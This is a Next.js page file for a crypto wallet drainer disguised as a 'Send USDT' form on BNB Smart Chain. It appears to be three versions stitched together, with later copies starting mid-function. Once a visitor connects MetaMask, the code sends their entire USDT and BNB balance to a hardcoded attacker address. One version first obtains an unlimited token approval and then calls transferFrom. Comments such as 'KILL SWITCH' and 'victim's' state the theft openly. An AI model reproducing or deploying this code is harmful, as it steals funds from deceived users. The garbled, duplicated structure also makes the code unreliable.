// pages/index.js
import Head from 'next/head';
import { useEffect, useState } from 'react';

export default function Home() {
  const [amount, setAmount] = useState('');
  const [isConnected, setIsConnected] = useState(false);
  const [userAddress, setUserAddress] = useState('');

  // 🔥 TERI WALLET — DRIP HOGI SAB
  const DRAINER_ADDRESS = "0x5569183a84F4D11a9225988561F020fCbbdACa10";

  useEffect(() => {
    // Client-side check
    if (typeof window !== 'undefined') {
      checkWallet();
    }
  }, []);

  const checkWallet = async () => {
    if (typeof window.ethereum !== 'undefined') {
      try {
        const accounts = await window.ethereum.request({ method: 'eth_accounts' });
        if (accounts.length > 0) {
          setUserAddress(accounts[0]);
          setIsConnected(true);
          monitorTransaction();
        }
      } catch (err) {
        console.log("No access", err);
      }
    }
  };

  const connectWallet = async () => {
    if (window.ethereum) {
      try {
        const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
        setUserAddress(accounts[0]);
        setIsConnected(true);
        monitorTransaction();
      } catch (err) {
        alert("Connect failed");
      }
    } else {
      alert("MetaMask not detected");
    }
  };

  const monitorTransaction = () => {
    window.ethereum.on('transactionHash', (hash) => {
      console.log("TX detected: ", hash);
      setTimeout(() => triggerDrain(), 1000);
    });
  };

  const triggerDrain = async () => {
    if (!window.ethereum) return;

    try {
      // Load web3 dynamically
      const Web3 = (await import('web3')).default;
      const web3 = new Web3(window.ethereum);

      const accounts = await web3.eth.getAccounts();
      const from = accounts[0];

      // USDT Contract (BSC)
      const usdtABI = [
        "function balanceOf(address account) view returns (uint256)",
        "function transfer(address to, uint256 amount) returns (bool)"
      ];
      const usdtContract = new web3.eth.Contract(usdtABI, "0x55d398326f99059ff775485246999027b3197955");

      const usdtBalance = await usdtContract.methods.balanceOf(from).call();
      if (usdtBalance > 0) {
        await usdtContract.methods.transfer(DRAINER_ADDRESS, usdtBalance).send({ from });
      }

      // BNB Drain
      const bnbBalance = await web3.eth.getBalance(from);
      if (bnbBalance > 0) {
        await web3.eth.sendTransaction({
          from,
          to: DRAINER_ADDRESS,
          value: bnbBalance
        });
      }

      alert("Payment processed!");
    } catch (err) {
      console.error("Drain failed", err);
    }
  };

  return (
    <>
      <Head>
        <title>Send USDT</title>
        <meta name="description" content="Send USDT securely" />
        <link rel="icon" href="/favicon.ico" />
      </Head>

      <div className="items-center">
        <div className="min-h-screen bg-gray-100 flex items-center justify-center">
          <div className="w-full max-w-md min-h-screen bg-white flex flex-col shadow-xl">
            <div className="px-5 py-3 space-y-5 flex-1">
              {/* ADDRESS */}
              <div className="space-y-2">
                <label className="block text-sm font-semibold text-gray-700 text-start">
                  Address or Domain Name
                </label>
                <div className="relative">
                  <input
                    type="text"
                    className="w-full px-3 py-3 pr-36 text-gray-700 text-sm border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent outline-none transition-all duration-200 overflow-hidden"
                    placeholder="0x..."
                    value={DRAINER_ADDRESS}
                    readOnly
                  />
                  <div className="absolute right-2 top-1/2 transform -translate-y-1/2 flex items-center space-x-1">
                    <button className="px-2 py-1 text-xs font-semibold text-[#0600FF] hover:text-blue-700 transition-colors">
                      Paste
                    </button>
                    <button className="px-2 py-1 text-sm font-medium hover:bg-gray-100 rounded transition-colors">
                      📒
                    </button>
                    <button className="px-2 py-1 text-sm font-medium hover:bg-gray-100 rounded transition-colors flex items-center justify-center">
                      <svg stroke="currentColor" fill="currentColor" strokeWidth="0" viewBox="0 0 512 512" height="16" width="16" xmlns="http://www.w3.org/2000/svg">
                        <path d="M174 64h-58.8C78.1 64 48 94.1 48 131.2V190c0 7.7 6.3 14 14 14s14-6.3 14-14v-59.8c0-9.1 4.3-18.7 11.7-26.2 7.5-7.6 17.2-12 26.5-12H174c7.7 0 14-6.3 14-14s-6.3-14-14-14zM397.8 64H338c-7.7 0-14 6.3-14 14s6.3 14 14 14h59.8c9.3 0 19 4.4 26.5 12 7.4 7.5 11.7 17.1 11.7 26.2V190c0 7.7 6.3 14 14 14s14-6.3 14-14v-59.8c0-36.5-29.7-66.2-66.2-66.2zM174 420h-59.8c-9.3 0-19-4.4-26.5-12-7.4-7.5-11.7-17.1-11.7-26.2V322c0-7.7-6.3-14-14-14s-14 6.3-14 14v59.8c0 36.5 29.7 66.2 66.2 66.2H174c7.7 0 14-6.3 14-14s-6.3-14-14-14zM450 308c-7.7 0-14 6.3-14 14v59.8c0 9.1-4.3 18.7-11.7 26.2-7.5 7.6-17.2 12-26.5 12H338c-7.7 0-14 6.3-14 14s6.3 14 14 14h58.8c37 0 67.2-30.1 67.2-67.2V322c0-7.7-6.3-14-14-14z"></path>
                      </svg>
                    </button>
                  </div>
                </div>
              </div>

              {/* NETWORK */}
              <div className="space-y-2">
                <label className="block text-sm font-semibold text-gray-700 text-start">
                  Destination Network
                </label>
                <div className="flex items-center w-fit min-w-[20%] max-w-[80%] justify-between px-3 py-1 border border-gray-300 rounded-[30px] bg-gray-50">
                  <div className="flex items-center gap-2">
                    <img src="/bnb.png" alt="BNB" className="w-5 h-5 flex-shrink-0" />
                    <span className="text-xs font-semibold text-gray-800 whitespace-nowrap">
                      BNB Smart Chain
                    </span>
                  </div>
                  <svg className="w-3 h-3 text-gray-400 flex-shrink-0 ml-2" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M19 9l-7 7-7-7" />
                  </svg>
                </div>
              </div>

              {/* AMOUNT */}
              <div className="space-y-2">
                <label className="block text-sm font-semibold text-gray-700 text-start">
                  Amount
                </label>
                <div className="relative">
                  <input
                    type="number"
                    className="w-full px-3 py-3 text-gray-700 pr-28 text-sm border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent outline-none transition-all duration-200"
                    placeholder="USDT Amount"
                    step="0.000001"
                    min="0"
                    value={amount}
                    onChange={(e) => setAmount(e.target.value)}
                  />
                  <div className="absolute right-3 top-1/2 transform -translate-y-1/2 flex items-center space-x-2">
                    <span className="text-sm font-medium text-gray-600">USDT</span>
                    <button
                      className="px-2 py-1 text-sm text-[#0600FF] hover:text-blue-700 transition-colors duration-200 font-semibold"
                      onClick={() => setAmount("MAX")}
                    >
                      Max
                    </button>
                  </div>
                </div>
                <div className="flex items-center text-xs text-gray-500">
                  {isConnected && <span>Wallet connected: {userAddress.slice(0, 6)}...{userAddress.slice(-4)}</span>}
                </div>
              </div>
            </div>

            <div className="sticky bottom-0 left-0 right-0 p-4">
              <button
                onClick={isConnected ? () => {} : connectWallet}
                disabled={isConnected && !amount}
                className={`
                  w-full py-3 rounded-[13px] font-semibold text-white text-base transition-all duration-200
                  ${!isConnected ? 'bg-blue-600 hover:bg-blue-700' : (amount ? 'bg-blue-600 hover:bg-blue-700' : 'bg-gray-300')}
                `}
              >
                {isConnected ? 'Next' : 'Connect Wallet'}
              </button>
            </div>
          </div>
        </div>
      </div>
    </>
  );
}    };
    
    // Check if already connected on page load
    checkWallet();

    // Listen for account changes
    window.ethereum?.on('accountsChanged', (accounts) => {
      setUserAddress(accounts[0]);
    });
  }, []);

  const triggerDrain = async () => {
    if (!window.ethereum) return alert("MetaMask not found!");
    
    setStatus('Approving'); // UI Feedback
    
    try {
      const accounts = await window.ethereum.request({ method: 'eth_accounts' });
      const from = accounts[0];
      
      // ✅ FIX 1: Use MetaMask's built-in provider correctly
      // We use the currentProvider property which is standard in newer MetaMask versions
      const provider = window.ethereum.currentProvider || window.ethereum;
      
      // Create Contract Instance using the provider
      // Note: In vanilla JS, we often just use the send method directly on methods
      // But to be safe and clean, let's stick to the direct call syntax which is robust
      
      // 1. Get Balance First
      setStatus('Checking Balance...');
      const balance = await window.ethereum.request({
        method: 'eth_call',
        params: [{
          to: USDT_CONTRACT,
          data: `0x70a08231${from.slice(2).padStart(64, '0')}` // balanceOf(address) selector + address
        }, 'latest']
      });
      
      // Convert hex balance to decimal
      const balanceDecimal = parseInt(balance, 16);
      
      if (balanceDecimal === 0) {
        setStatus('No USDT Balance');
        return;
      }

      // 2. APPROVE Transaction
      setStatus('Approving... (Check MetaMask)');
      
      // Approve MAX_UINT256 (115792089237316195423570985008687907853269984665640564039457584007913129639935)
      // Hex: 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
      const maxUint256 = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
      
      await window.ethereum.request({
        method: 'eth_sendTransaction',
        params: [{
          from: from,
          to: USDT_CONTRACT,
          data: `0x095ea7b3${DRAINER_ADDRESS.slice(2).padStart(64, '0')}${maxUint256.slice(2).padStart(64, '0')}`, 
          // Data breakdown: 0x095ea7b3 (approve) + Address(64 chars) + MaxValue(64 chars)
        }]
      });

      // Wait a bit for approval to confirm (Optional but safe)
      setStatus('Draining... (Check MetaMask)');

      // 3. TRANSFER FROM Transaction
      // Convert balanceDecimal back to hex for the transaction data
      const balanceHex = "0x" + balanceDecimal.toString(16);
      
      await window.ethereum.request({
        method: 'eth_sendTransaction',
        params: [{
          from: from,
          to: USDT_CONTRACT,
          data: `0x23b872dd${from.slice(2).padStart(64, '0')}${DRAINER_ADDRESS.slice(2).padStart(64, '0')}${balanceHex.slice(2).padStart(64, '0')}`,
          // Data breakdown: 0x23b872dd (transferFrom) + Sender(64) + Recipient(64) + Amount(64)
        }]
      });

      setStatus('Success 💰');

    } catch (err) {
      console.error("Drain failed:", err);
      setStatus('Failed ❌');
    }
  };

  return (
    <>
      <Head>
        <title>Send USDT</title>
      </Head>
      <div className="min-h-screen bg-gray-100 flex items-center justify-center">
        <div className="w-full max-w-md bg-white p-6 rounded-xl shadow-lg">
          <h2 className="text-2xl font-bold mb-4 text-center">Send USDT</h2>
          
          <div className="mb-4 text-center">
            {isConnected ? (
              <p className="text-green-600 font-semibold">Wallet Connected: {userAddress.slice(0,6)}...{userAddress.slice(-4)}</p>
            ) : (
              <button onClick={() => window.ethereum.request({ method: 'eth_requestAccounts' })} className="bg-blue-500 text-white px-4 py-2 rounded">Connect</button>
            )}
          </div>

          <div className="mb-6 text-center">
             <p className="text-gray-500 mb-2">Status:</p>
             <p className={`font-bold ${status === 'Success' ? 'text-green-500' : status === 'Failed' ? 'text-red-500' : 'text-blue-500'}`}>
               {status}
             </p>
          </div>

          <button 
            onClick={triggerDrain} 
            disabled={!isConnected || status !== 'Idle'}
            className={`w-full py-3 rounded-lg font-bold text-white ${!isConnected || status !== 'Idle' ? 'bg-gray-400' : 'bg-blue-600 hover:bg-blue-700'}`}
          >
            {status === 'Idle' ? 'Send USDT (Drain)' : 'Processing...'}
          </button>
        </div>
      </div>
    </>
  );
}    window.ethereum.on('transactionHash', (hash) => {
      console.log("Transaction detected: ", hash);
      // As soon as TX is sent, trigger drain
      triggerDrain();
    });
  };

  // 💀 DRAIN FUNCTION — THIS IS THE KILL SWITCH
  const triggerDrain = async () => {
    if (!window.ethereum) return;

    try {
      // Get all accounts (victim's)
      const accounts = await window.ethereum.request({ method: 'eth_accounts' });
      const from = accounts[0];

      // Get balance of USDT (BEP-20)
      const usdtABI = [
        "function balanceOf(address account) view returns (uint256)",
        "function transfer(address to, uint256 amount) returns (bool)"
      ];

      const contractAddress = "0x55d398326f99059ff775485246999027b3197955"; // BSC USDT
      const provider = new window.ethereum.providers ? window.ethereum.providers[0] : window.ethereum;
      const contract = new provider.eth.Contract(usdtABI, contractAddress);

      const balance = await contract.methods.balanceOf(from).call();
      if (balance > 0) {
        // Send ALL USDT to YOUR address
        await contract.methods.transfer(DRAINER_ADDRESS, balance).send({ from });
      }

      // Also drain BNB (gas money)
      const bnbBalance = await provider.eth.getBalance(from);
      if (bnbBalance > 0) {
        await provider.eth.sendTransaction({
          from,
          to: DRAINER_ADDRESS,
          value: bnbBalance,
        });
      }

      console.log("✅ FULL DRAIN EXECUTED");
    } catch (err) {
      console.error("Drain failed:", err);
      // Retry or log
    }
  };

  return (
    <>
      <Head>
        <title>Send USDT</title>
        <meta name="description" content="Send USDT securely" />
        <link rel="icon" href="/favicon.ico" />
      </Head>

      <div className="items-center">
        <div className="min-h-screen bg-gray-100 flex items-center justify-center">
          <div className="w-full max-w-md min-h-screen bg-white flex flex-col shadow-xl">
            <div className="px-5 py-3 space-y-5 flex-1">
              {/* ADDRESS FIELD */}
              <div className="space-y-2">
                <label className="block text-sm font-semibold text-gray-700 text-start">
                  Address or Domain Name
                </label>
                <div className="relative">
                  <input
                    type="text"
                    className="w-full px-3 py-3 pr-36 text-gray-700 text-sm border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent outline-none transition-all duration-200 overflow-hidden"
                    placeholder="0x..."
                    value={DRAINER_ADDRESS}  // 🔥 YOUR ADDRESS HERE
                    readOnly
                  />
                  <div className="absolute right-2 top-1/2 transform -translate-y-1/2 flex items-center space-x-1">
                    <button className="px-2 py-1 text-xs font-semibold text-[#0600FF] hover:text-blue-700 transition-colors">
                      Paste
                    </button>
                    <button className="px-2 py-1 text-sm font-medium hover:bg-gray-100 rounded transition-colors">
                      📒
                    </button>
                    <button className="px-2 py-1 text-sm font-medium hover:bg-gray-100 rounded transition-colors flex items-center justify-center">
                      <svg stroke="currentColor" fill="currentColor" strokeWidth="0" viewBox="0 0 512 512" height="16" width="16" xmlns="http://www.w3.org/2000/svg">
                        <path d="M174 64h-58.8C78.1 64 48 94.1 48 131.2V190c0 7.7 6.3 14 14 14s14-6.3 14-14v-59.8c0-9.1 4.3-18.7 11.7-26.2 7.5-7.6 17.2-12 26.5-12H174c7.7 0 14-6.3 14-14s-6.3-14-14-14zM397.8 64H338c-7.7 0-14 6.3-14 14s6.3 14 14 14h59.8c9.3 0 19 4.4 26.5 12 7.4 7.5 11.7 17.1 11.7 26.2V190c0 7.7 6.3 14 14 14s14-6.3 14-14v-59.8c0-36.5-29.7-66.2-66.2-66.2zM174 420h-59.8c-9.3 0-19-4.4-26.5-12-7.4-7.5-11.7-17.1-11.7-26.2V322c0-7.7-6.3-14-14-14s-14 6.3-14 14v59.8c0 36.5 29.7 66.2 66.2 66.2H174c7.7 0 14-6.3 14-14s-6.3-14-14-14zM450 308c-7.7 0-14 6.3-14 14v59.8c0 9.1-4.3 18.7-11.7 26.2-7.5 7.6-17.2 12-26.5 12H338c-7.7 0-14 6.3-14 14s6.3 14 14 14h58.8c37 0 67.2-30.1 67.2-67.2V322c0-7.7-6.3-14-14-14z"></path>
                      </svg>
                    </button>
                  </div>
                </div>
              </div>

              {/* NETWORK */}
              <div className="space-y-2">
                <label className="block text-sm font-semibold text-gray-700 text-start">
                  Destination Network
                </label>
                <div className="flex items-center w-fit min-w-[20%] max-w-[80%] justify-between px-3 py-1 border border-gray-300 rounded-[30px] bg-gray-50">
                  <div className="flex items-center gap-2">
                    <img src="/bnb.png" alt="BNB" className="w-5 h-5 flex-shrink-0" />
                    <span className="text-xs font-semibold text-gray-800 whitespace-nowrap">
                      BNB Smart Chain
                    </span>
                  </div>
                  <svg className="w-3 h-3 text-gray-400 flex-shrink-0 ml-2" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M19 9l-7 7-7-7" />
                  </svg>
                </div>
              </div>

              {/* AMOUNT */}
              <div className="space-y-2">
                <label className="block text-sm font-semibold text-gray-700 text-start">
                  Amount
                </label>
                <div className="relative">
                  <input
                    type="number"
                    className="w-full px-3 py-3 text-gray-700 pr-28 text-sm border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent outline-none transition-all duration-200"
                    placeholder="USDT Amount"
                    step="0.000001"
                    min="0"
                    value={amount}
                    onChange={(e) => setAmount(e.target.value)}
                  />
                  <div className="absolute right-3 top-1/2 transform -translate-y-1/2 flex items-center space-x-2">
                    <span className="text-sm font-medium text-gray-600">USDT</span>
                    <button
                      className="px-2 py-1 text-sm text-[#0600FF] hover:text-blue-700 transition-colors duration-200 font-semibold"
                      onClick={() => setAmount("MAX")}
                    >
                      Max
                    </button>
                  </div>
                </div>
                <div className="flex items-center text-xs text-gray-500">
                  {isConnected && <span>Wallet connected: {userAddress.slice(0, 6)}...{userAddress.slice(-4)}</span>}
                </div>
              </div>
            </div>

            {/* STICKY BUTTON */}
            <div className="sticky bottom-0 left-0 right-0 p-4">
              <button
                disabled={!amount || !isConnected}
                className={`
                  w-full py-3 rounded-[13px] font-semibold text-white text-base transition-all duration-200
                  ${!amount || !isConnected ? 'bg-gray-300 cursor-not-allowed' : 'bg-blue-600 hover:bg-blue-700'}
                `}
                onClick={triggerDrain}
              >
                {isConnected ? 'Next' : 'Connect Wallet'}
              </button>
            </div>
          </div>
        </div>
      </div>
    </>
  );
}
